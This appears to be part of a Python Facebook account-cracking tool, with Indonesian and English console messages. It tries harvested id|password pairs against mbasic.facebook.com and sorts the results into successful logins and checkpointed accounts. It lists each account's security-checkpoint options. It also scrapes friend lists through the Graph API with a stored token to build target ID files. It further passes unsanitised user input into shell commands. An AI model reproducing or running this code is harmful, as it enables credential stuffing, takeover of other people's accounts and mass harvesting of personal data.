		print('\r%s++++ %s|%s ----> CP	   %s' % (b, idf, pw, x))
		open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
		cp += 1
		opsi = kent.find_all('option')
		if len(opsi) == 0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
		for opsii in opsi:
			print('\r%s---> %s%s' % (kk, opsii.text, x))
	except Exception as c:
			print('\r%s++++ %s|%s ----> CP	   %s' % (b, idf, pw, x))
			print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s' % (u, x))
			open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
			cp += 1

def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
	cetak(nel(hu, 'CEK OPSI', **('title',)))
	input(u + '[' + h + '•' + u + '] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id = kes.split('|')[0]
				pw = kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error	  %s' % (b, kes, x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
				continue
			bi = random.choice([u, k, kk, b, h, hh])
			print('\r%s---> %s/%s ---> { %s }%s' % (bi, love, len(akun), id, x), ' ', **('end',))
			sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email': id,'pass': pw,'login': 'submit'}, headers=header, allow_redirects=True).text, 'html.parser')
			if 'checkpoint' in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh', 'jazoest', 'fb_dtsg', 'submit[Continue]', 'checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'): anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
					print('\r%s++++ %s|%s ----> CP	   %s' % (b, id, pw, x))
					opsi = kent.find_all('option')
					if len(opsi) == 0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s' % (kk, opsii.text, x))
				except:
					print('\r%s++++ %s|%s ----> CP	   %s' % (b, id, pw, x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s' % (u, x))
					if 'c_user' in ses.cookies.get_dict().keys():
						print('\r%s++++ %s|%s ----> OK	   %s' % (h, id, pw, x))
					else:
						print('\r%s++++ %s|%s ----> SALAH	   %s' % (x, id, pw, x))
				love += 1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
	
def cek_apk(session, cookie):
	w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies={'cookie': cookie}).text
	sop = BeautifulSoup(w, 'html.parser')
	x = sop.find('form', method='post')
	game = [i.text for i in x.find_all('h3')]
	if len(game) == 0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print('   %s%s. %s%s' % (H, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
	w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies={'cookie': cookie}).text
	sop = BeautifulSoup(w, 'html.parser')
	x = sop.find('form', method='post')
	game = [i.text for i in x.find_all('h3')]
	if len(game) == 0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print('   %s%s. %s%s' % (K, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))

def create_file():
    os.system('clear')
    print(logo)
    print('  [1] Create file manual')
    print('  [2] Create file auto')
    print('  [B] Back to main menu')
    print(50*'-')
    cf = input('  Choose method: ')
    if cf =='1':
        manual()
    elif cf =='2':
        auto()
    elif cf =='3':
        likes()
    elif cf =='3' or cf =='b' or cf =='B':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        create_file()

def manual():
    try:
        token = open('/sdcard/tokenofl.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s: '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    sarfraz()
    
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('/sdcard/tokenofl.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
           # print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    safraz()
def dupcutter():
	os.system('clear');print(logo)
	print("[+] Example : /sdcard/your_file_name.txt  \n\n")
	Mahar = input('[+] File Path   : ')
	Armsty = input('[+] New File Save As : ')
	os.system('touch ' +Armsty)
	os.system('sort -r '+Mahar+' | uniq > '+Armsty)
	print("")
	print("")
	print(54*"\033[1;33m_")
	print("")
	print("[+] Removing Successful  From File " + Mahar )
	print("[+] New File Save " + Armsty )
	print(54*"\033[1;33m_")
	time.sleep(2)
    
    
    
sarfraz()
